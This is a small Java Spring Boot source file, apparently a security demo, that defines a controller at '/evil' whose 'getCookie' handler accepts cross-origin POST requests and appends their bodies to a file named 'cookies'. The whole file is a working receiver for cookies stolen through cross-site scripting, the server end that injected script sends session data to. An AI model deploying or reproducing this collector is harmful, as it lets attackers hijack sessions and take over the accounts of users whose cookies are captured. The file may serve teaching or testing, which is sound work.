package ru.hh.sniffer;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;

@RestController
@RequestMapping("/evil")
public class SnifferController {

  private static final Logger logger = LoggerFactory.getLogger(SnifferController.class);

  @PostMapping
  @CrossOrigin
  public void getCookie(@RequestBody String str) {
    try (FileWriter fw = new FileWriter("cookies", true);
         BufferedWriter bw = new BufferedWriter(fw)) {
      bw.write(str);
      bw.newLine();
    } catch (IOException e) {
      logger.error(e.getMessage());
    }
  }
}
